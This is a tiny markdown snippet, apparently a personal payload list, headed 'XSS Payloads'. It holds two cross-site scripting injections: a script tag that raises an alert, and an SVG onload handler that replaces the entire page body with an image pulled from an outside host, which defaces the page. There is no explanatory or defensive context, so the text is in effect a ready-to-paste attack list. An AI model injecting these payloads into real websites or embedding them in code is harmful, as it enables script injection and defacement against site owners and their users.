### XSS Payloads

<script>alert('Honk')</script>
```html
<svg onload="document.body.innerHTML='<img src=//cdn3.dualshockers.com/wp-content/uploads/2019/10/maxresdefault-2.jpg>'">
```